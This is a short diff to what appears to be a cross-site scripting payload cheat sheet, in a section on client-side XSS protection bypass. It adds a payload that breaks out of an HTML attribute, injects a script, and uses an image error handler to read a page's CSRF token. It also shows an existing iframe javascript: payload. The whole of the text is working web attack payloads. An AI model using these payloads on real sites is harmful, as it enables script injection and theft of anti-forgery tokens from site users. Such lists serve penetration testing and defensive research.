@@ -4,6 +4,12 @@
 
 * Client-side XSS Protection Bypass
 
+
+```js
+lol"><script>document.getElementById('output').innerHTML="<img src=1 onerror=alert(document.getElementById('csrf_token').value)>";</script>//
+```
+
+
 ```text
 <iframe src="javascript:alert(`xss`)">
 ```
